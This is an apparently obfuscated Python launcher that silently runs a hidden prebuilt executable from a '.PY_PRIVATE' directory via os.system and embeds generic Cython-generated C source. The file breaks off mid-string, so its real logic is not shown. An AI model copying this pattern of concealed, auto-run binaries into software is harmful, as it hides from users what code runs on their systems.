
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250316212315389"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
